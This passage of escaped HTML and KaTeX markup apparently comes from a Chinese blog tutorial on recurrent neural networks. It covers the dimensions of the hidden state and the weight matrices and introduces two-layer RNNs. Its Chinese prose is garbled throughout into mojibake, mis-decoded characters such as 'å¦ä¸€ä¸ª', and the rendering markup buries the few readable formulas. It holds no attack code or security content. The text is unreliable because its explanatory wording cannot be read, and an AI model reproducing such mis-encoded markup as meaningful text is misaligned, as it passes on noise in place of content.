style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å¦ä¸€ä¸ªè¾“å…¥æ˜¯ä¸Šä¸€æ—¶åˆ»çš„éšå±‚çŠ¶æ€&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;h_{t-1}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.902771em;vertical-align:-0.208331em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.301108em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.208331em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œå®ƒçš„ç»´åº¦æ˜¯&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;[batch, hidden\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œä¸æƒé‡çŸ©é˜µ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;/msubsup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;w_{hh}^T&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.1244389999999997em;vertical-align:-0.2831079999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8413309999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4168920000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2831079999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;åšçŸ©é˜µè¿ç®—ï¼ŒçŸ©é˜µ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;/msubsup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;w_{hh}^T&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.1244389999999997em;vertical-align:-0.2831079999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8413309999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4168920000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2831079999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;çš„ç»´åº¦æ˜¯&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;[hidden\space len,hidden\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œè¿ç®—ç»“æœçš„ç»´åº¦æ˜¯&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;[batch, hidden\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å°†ä¸¤ä¸ªç»“æœè¿›è¡Œç›¸åŠ å¾—åˆ°è¦è¾“å…¥åˆ°ä¸‹ä¸€æ—¶åˆ»çš„éšå±‚çŠ¶æ€&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;h_t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.84444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å¤šå±‚RNN&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å¯¹äºå¤šå±‚çš„RNNï¼ŒåŒ…å«äº†å¤šä¸ªçº¿æ€§å±‚ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºæ˜¯ä¸€ä¸ªäºŒå±‚çš„RNNï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554602087.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;æ¯ä¸€å±‚çº¿æ€§å±‚å°†ä¸Šä¸€å±‚çš„è¾“å‡ºå’Œä¸Šä¸€æ—¶åˆ»çš„éšå±‚çŠ¶æ€ä½œä¸ºè¾“å…¥ï¼Œä»¥äºŒå±‚ä¸ºä¾‹ï¼Œç¬¬ä¸€å±‚ä»¥åµŒå…¥å‘é‡å’Œä¸Šä¸€æ—¶åˆ»éšå±‚çŠ¶æ€ä½œä¸ºè¾“å…¥ï¼Œç¬¬äºŒå±‚ä»¥ç¬¬ä¸€å±‚çš„è¾“å‡ºå’Œä¸Šä¸€æ—¶åˆ»çš„éšå±‚çŠ¶æ€ä½œä¸ºè¾“å…¥ã€‚å…¶ç»´åº¦ä¸ºï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x_t/feature\space [batch, feature\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msubsup&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;w_{xh}^1\space [hidden\space len, feature \space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.097216em;vertical-align:-0.2831079999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span 